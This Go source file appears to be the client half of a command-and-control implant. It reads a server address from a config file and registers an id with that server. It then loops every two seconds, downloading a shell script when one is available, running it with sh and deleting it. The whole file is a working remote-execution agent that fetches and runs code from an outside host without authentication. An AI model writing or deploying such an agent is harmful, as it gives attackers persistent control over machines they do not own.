package main

import (
	"./target_api"
	"io/ioutil"
	"encoding/json"
	"os/exec"
	"strings"
	"time"
	"fmt"
	"os"
)

type json_data struct {
	IP string `json:"IP"`
}

var id_file_name = "id_name.txt"
var sh_file_name = "command.sh"
var roop = true

func main() {
	url := connect_url()

	if url == "None" {
		os.Exit( 0 )
	}

	var my_id string
	my_id = read_id()

	if my_id == "None" {
		first_req := target_api.First_send( url )
		my_id = first_req

		if first_req == "None" {
			os.Exit( 0 )
		}
		
		if !write_id( first_req ) {
			os.Exit( 0 )
		}
	}

	my_id = strings.Replace( my_id, "\n", "", -1 )

	for roop == true {
		if target_api.Search_sh( url, my_id ) {
			exec.Command( "sh", sh_file_name ).Run()
			exec.Command( "rm", sh_file_name ).Run()
			fmt.Println( "ok" )
		}
		
		fmt.Println( "no" )
		time.Sleep( 2 * time.Second )
	}
}

func write_id( id string ) bool {
	file, err := os.OpenFile( id_file_name, os.O_WRONLY|os.O_CREATE, 0666 )
	defer file.Close()

	if err != nil {
		return false
	}

	fmt.Fprintln( file, id )
	return true
}

func read_id() string {
	file, err := ioutil.ReadFile( id_file_name )

	if err != nil {
		return "None"
	}

	return string( file )
}

func connect_url() string {
	url := "http://"
	raw, err := ioutil.ReadFile("../config.json")

	if err != nil {
		return "None"
	}

	var data json_data

	json.Unmarshal( raw, &data )

	url += data.IP

	return url
}

